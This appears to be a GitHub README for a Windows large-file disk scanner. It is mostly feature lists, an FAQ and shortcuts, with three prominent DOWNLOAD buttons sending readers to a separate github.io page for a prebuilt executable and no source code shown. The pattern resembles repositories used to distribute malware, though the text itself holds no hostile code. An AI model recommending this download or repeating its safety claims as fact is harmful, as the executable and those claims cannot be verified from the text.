<div align="center">

<img src="assets/banner.svg" width="100%" alt="Large File Scanner banner"/>

# large-file-scanner-utility 🔍💾

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*Find the digital dead weight hogging your drive — before your drive finds out the hard way.*

<p align="center">
  <a href="https://SwordEntrance.github.io/large-file-scanner-utility/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Large_File_Scanner-9333EA?style=for-the-badge&logo=windows&logoColor=white&labelColor=7E22CE" width="550" alt="Download"/>
  </a>
</p>
</div>

---

## 🧭 Overview

Every hard drive eventually turns into an attic — full of things you swore you'd need "someday," slowly burying the stuff you actually use. **large-file-scanner-utility** is a lightweight Windows companion built to shine a flashlight into that attic. It walks your directories, sizes up every file and folder, and hands you a clean, sortable map of exactly where your gigabytes went. No guesswork, no clicking through nested folders forty layers deep — just answers.

This project exists because disk space anxiety is universal. Video editors watch render caches balloon overnight. Developers accumulate stale `node_modules` graveyards and forgotten build artifacts. Gamers install titles that quietly eat 100GB and never get uninstalled. A large file scanner isn't a luxury tool — it's digital housekeeping, and it should be fast, visual, and honest about what it finds. That's the philosophy baked into every scan this utility runs.

Whether you're a system administrator auditing shared network storage, a content creator managing terabytes of raw footage, or just someone whose "Local Disk (C:)" icon has turned an alarming shade of red, this tool is built for you. It's a standalone Windows utility — no accounts, no cloud uploads, no mystery background processes. Point it at a drive, let it scan, and get a clear breakdown of your largest, oldest, and most redundant files in minutes.

<p align="center">

<a href="https://SwordEntrance.github.io/large-file-scanner-utility/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Large_File_Scanner-9333EA?style=for-the-badge&logo=windows&logoColor=white&labelColor=7E22CE" width="550" alt="Download"/>
  </a>

</p>

> [!TIP]
> New here? Skip straight to the **Get Rolling in Under a Minute** section below for a no-nonsense quick start.

---

## ⚡ Get Rolling in Under a Minute

1. **Visit the landing page** using the download button above — that's the only place this tool is distributed.

2. **Grab the latest build** for Windows 10/11 (64-bit).

3. **Run the executable** — no installer wizard, no admin rituals required for a basic scan.

4. **Pick a drive or folder** and hit scan. Grab a coffee if it's a big volume — the results are worth the wait.

> [!NOTE]
> First scans of large drives (1TB+) can take a few minutes depending on file count, not just total size. Millions of tiny files are often slower to enumerate than a handful of massive ones.

---

<details>
<summary><strong>🔥 What This Thing Actually Does</strong></summary>

<br>

- **Deep directory sweeping** — recursively walks every subfolder on a chosen path, no matter how deeply nested, and never loses track of where it's been.

- **Size-ranked results table** — every file and folder gets sorted largest-first, so the worst offenders float straight to the top instead of hiding on page 12.

- **Duplicate footprint hints** — flags files with matching size-and-name patterns that are likely copies, letting you reclaim space without guessing.

- **Age-aware highlighting** — surfaces files that haven't been touched in months or years, because "large" and "forgotten" are usually the same file.

- **Live scan progress** — a real-time counter and progress indicator so you're never staring at a frozen window wondering if it crashed.

- **Filterable file-type breakdown** — group results by extension (.mp4, .iso, .zip, .log) to see which file categories are the real disk-space culprits.

- **Export to CSV** — save your scan results for reporting, spreadsheets, or comparing disk usage over time.

- **Safe-delete workflow** — files go to the Recycle Bin by default, never a permanent wipe unless you explicitly say so.

- **Portable, no-trace operation** — the utility doesn't write to your registry or scatter files across `AppData`; delete the folder and it's gone.

</details>

<details>
<summary><strong>🖥️ System Requirements</strong></summary>

<br>

| Requirement | Details |
|---|---|
| **OS** | Windows 10 (64-bit) or Windows 11 |
| **RAM** | 2 GB minimum, 4 GB recommended for network drives |
| **Disk Space** | Under 50 MB for the utility itself |
| **Dependencies** | None — fully standalone executable |
| **Permissions** | Standard user for local drives; admin rights recommended for scanning system-protected folders |
| **.NET Runtime** | Bundled — nothing to install separately |

![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square) ![Build](https://img.shields.io/badge/build-passing-success?style=flat-square) ![Arch](https://img.shields.io/badge/architecture-x64-informational?style=flat-square)

> [!IMPORTANT]
> This is a Windows-native utility. There is currently no macOS or Linux build, and none is planned in the near term.

</details>

---

## 🛠️ How It Works

The scanning engine follows a simple, predictable pipeline every time — no hidden steps, no background telemetry sneaking around behind your back.

1. **You select a target** — a drive letter, a specific folder, or a mapped network path.

2. **The engine enumerates** every file and folder beneath that target, building a size tree as it goes.

3. **Results get aggregated** — folder sizes roll up from their contents, and files get ranked.

4. **You review and filter** — sort by size, type, or last-modified date to zero in on what matters.

5. **You act** — delete, move, or export, all from the same results view.

```mermaid
flowchart LR

Select --> Scan

Scan --> Aggregate

Aggregate --> Review

Review --> Action

```

> [!TIP]
> Running a scan on a network share? Point it at a mapped drive letter rather than a raw UNC path — enumeration tends to be noticeably faster.

---

<details>
<summary><strong>❓ Troubleshooting & Common Questions</strong></summary>

<br>

**Q: The scan seems stuck at a specific folder — is it frozen?**
A: Probably not. Deeply nested system folders (like `WindowsApps` or `ProgramData`) can slow enumeration due to permission checks. Give it another minute before force-closing.

**Q: Why does the total shown differ slightly from Windows' own "Properties" size?**
A: Windows sometimes reports allocated disk space (including cluster overhead) while the scanner reports actual file byte size. Small discrepancies are normal and expected.

**Q: Some folders show as "Access Denied" in the results — how do I fix this?**
A: Relaunch the utility with administrator privileges. System and other-user profile folders are locked down by Windows by default.

**Q: I deleted a large file and it's not showing back the space — why?**
A: Check your Recycle Bin. Files removed through the safe-delete workflow land there first and only free space once emptied.

**Q: Can I scan a removable USB drive or external HDD?**
A: Yes — any mounted drive letter works exactly the same as an internal disk.

**Q: The duplicate detection flagged files that aren't actually duplicates — is that a bug?**
A: It's a heuristic based on size and naming patterns, not byte-for-byte hashing, so occasional false positives are expected. Always eyeball results before deleting.

</details>

---

## 🎨 UI & UX Details

The interface is built to feel snappy even on large scans, with a few thoughtful touches:

- **Keyboard shortcuts:**

  | Shortcut | Action |
  |---|---|
  | `Ctrl + N` | Start a new scan |
  | `Ctrl + F` | Focus the filter/search bar |
  | `Ctrl + E` | Export current results to CSV |
  | `Delete` | Send selected item to Recycle Bin |
  | `F5` | Refresh/re-scan current path |
  | `Esc` | Cancel an active scan |

- **Themes** — Light and Dark mode, switchable from Settings, with the app remembering your last choice on relaunch.

- **Adjustable scan depth** — limit recursion depth for a quick surface-level pass instead of a full deep dive.

- **Column customization** — show or hide columns like last-modified date, file type, or full path.

> [!WARNING]
> Sorting by size on an extremely large result set (500,000+ items) may briefly lag the UI while it re-renders. This is cosmetic only — no data is lost.

---

## 🤝 Contributing & Community

This project grows because people like you report bugs, suggest features, and occasionally just tell us what's confusing. A few ways to get involved:

> - Open an issue for bugs, with your Windows version and drive type (local/network/removable) included.
>
> - Suggest features through the discussions tab — scan-speed ideas and UX tweaks are especially welcome.
>
> - Share your before/after disk space screenshots — it's genuinely motivating for the maintainers.

![Contributions](https://img.shields.io/badge/contributions-welcome-orange?style=flat-square) ![Issues](https://img.shields.io/badge/issues-tracked-blue?style=flat-square)

---

## 📜 License

Released under the [MIT License](LICENSE), 2026. Use it, adapt it, ship it — just keep the license notice intact.

---

## ⚠️ Disclaimer

This utility reports and helps you manage disk usage, but **you** are always the one making the final call on deletions. Always double-check flagged files before removing them, especially in shared or system-critical folders. The maintainers aren't responsible for data loss resulting from misuse, misidentified files, or skipped backups — when in doubt, back it up first.

<p align="center">

<a href="https://SwordEntrance.github.io/large-file-scanner-utility/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Large_File_Scanner-9333EA?style=for-the-badge&logo=windows&logoColor=white&labelColor=7E22CE" width="550" alt="Download"/>
  </a>

</p>